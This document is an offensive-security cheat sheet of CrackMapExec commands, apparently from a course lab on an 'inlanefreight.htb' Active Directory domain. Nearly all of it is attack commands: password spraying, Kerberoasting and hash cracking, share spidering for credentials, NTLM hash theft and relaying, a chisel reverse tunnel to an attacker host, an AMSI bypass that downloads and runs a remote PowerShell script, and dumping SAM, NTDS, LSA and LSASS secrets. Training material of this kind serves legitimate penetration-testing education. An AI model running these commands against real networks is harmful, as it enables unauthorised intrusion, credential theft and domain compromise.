
---

> Gathering Information Anonymously

```bash
# Basic SMB Recon
crackmapexec smb 192.168.133.0/24
crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

# Exploiting NULL/Anonymous Sessions
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
crackmapexec smb 10.129.203.121  -u '' -p '' --users --export $(pwd)/users.txt
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
crackmapexec smb 10.129.203.121 -u '' -p '' --shares
crackmapexec smb 10.129.203.121 -u guest -p '' --shares

# Password Spraying
crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01! --continue-on-success --no-bruteforce
crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce
crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! # domain
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! --local-auth

# Finding ASREPRoastable Accounts
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt # reminder
```

> Gathering Information with an account

```bash
# Searching for Accounts in Group Policy Objects
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin

# Working with Modules
crackmapexec ldap -L
crackmapexec ldap -M user-desc --options
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin

# MSSQL Enumeration and Attacks
crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases" (--local-auth)
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback

# Finding Kerberoastable Accounts
crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt # reminder

# Spidering and Finding Information in an SMB Share
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT (--pattern txt)
(--regex .) (--content --regex Encrypt)
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT (--get-file Creds.txt Creds.txt) (--put-file /etc/passwd passwd)
crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false

# Proxychains with CME
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
chisel server --reverse
proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "Stop-Process -Name chisel -Force"

# Stealing Hashes
crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt # list smb signing disabled
ntlmrelayx.py -tf relay.txt -smb2support --no-http
crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret # other way
```

>  **Gathering Information with an Administrator Account**

|                                                            |                                                                                 |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **Command**                                                | **Description**                                                                 |
| `crackmapexec smb <target> -u <u> -p <p> --loggedon-users` | Enumerate logged users on the target                                            |
| `crackmapexec smb <target> -u <u> -p <p> --sessions`       | Enumerate active sessions on the target                                         |
| `crackmapexec smb <target> -u <u> -p <p> --disks`          | Enumerate disks on the target                                                   |
| `crackmapexec smb <target> -u <u> -p <p> --computers`      | Enumerate computer on the target domain                                         |
| `crackmapexec smb <target> -u <u> -p <p> --wmi`            | Issues the specified WMI query                                                  |
| `crackmapexec smb <target> -u <u> -p <p> --wmi-namespace`  | WMI Namespace (default: root\cimv2)                                             |
| `crackmapexec smb <target> -u <u> -p <p> --rid-brute`      | Enumerate users by bruteforcing the RID on the target                           |
| `crackmapexec smb <target> -u <u> -p <p> --local-groups`   | Enumerate local groups, if a group is specified then its members are enumerated |
| `crackmapexec smb <target> -u <u> -p <p> --shares`         | Enumerate permissions on all shares of the target                               |
| `crackmapexec smb <target> -u <u> -p <p> --users`          | Enumerate domain users on the target                                            |
| `crackmapexec smb <target> -u <u> -p <p> --groups <group>` | Enumerate domain groups on the target                                           |
| `crackmapexec smb <target> -u <u> -p <p> --pass-pol`       | Password policy of the domain                                                   |

> **LDAP and RDP Enumeration**

|                                                                     |                                                                      |
| ------------------------------------------------------------------- | -------------------------------------------------------------------- |
| **Command**                                                         | **Description**                                                      |
| `crackmapexec ldap <target> -u <u> -p <p> --users`                  | Enumerate enabled domain users                                       |
| `crackmapexec ldap <target> -u <u> -p <p> --groups`                 | Enumerate domain groups                                              |
| `crackmapexec ldap <target> -u <u> -p <p> --password-not-required`  | Get the list of users with flag PASSWD_NOTREQD                       |
| `crackmapexec ldap <target> -u <u> -p <p> --trusted-for-delegation` | Get the list of users and computers with flag TRUSTED_FOR_DELEGATION |
| `crackmapexec ldap <target> -u <u> -p <p> --admin-count`            | Get objets that had the value adminCount=1                           |
| `crackmapexec ldap <target> -u <u> -p <p> --get-sid`                | Get domain sid                                                       |
| `crackmapexec ldap <target> -u <u> -p <p> --gmsa`                   | Enumerate GMSA passwords                                             |
| `crackmapexec rdp <target> -u <u> -p <p> --nla-screenshot`          | Screenshot RDP login prompt if NLA is disabled                       |
| `crackmapexec rdp <target> -u <u> -p <p> --screenshot`              | Screenshot RDP if connection success                                 |
| `crackmapexec rdp <target> -u <u> -p <p> --screentime SCREENTIME`   | Time to wait for desktop image                                       |
| `crackmapexec rdp <target> -u <u> -p <p> --res RES`                 | Resolution in "WIDTHxHEIGHT" format. Default: "1024x768"             |

---

> Command Execution

```bash
# Command Execution
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "net localgroup administrators"
crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth -x whoami
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --exec-method (smbexec / wmiexec) -x whoami
crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami
crackmapexec ssh 10.129.204.133 -u robert -p 'Inlanefreight01!' -x ipconfig
crackmapexec ssh 10.129.204.133 -u julio --key-file id_ed25519 -p "" -x whoami

# AMSI Bypass
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
sudo python3 -m http.server 80
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass amsibypass.txt

# Finding Secrets and Using Them
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight' --sam
crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight' --ntds (--user x) (--enabled)
crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight' --laps
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight' --lsa
cat /home/plaintext/.cme/logs/file.cached| cut -d ":" -f 2
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M lsassy
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M procdump
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M handlekatz
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M nanodump
```

---

> CrackMapExec Modules


```bash
# Popular Modules
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps
crackmapexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -M maq
crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o TARGET=grace ACTION=read
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp -o ACTION=enable

# Vulnerability Scan Modules
crackmapexec smb 172.16.10.3 -M Zerologon
crackmapexec smb 172.16.10.3 -M PetitPotam
crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M nopac
crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M dfscoerce
crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce
crackmapexec smb 172.16.10.3 -M ms17-010
```
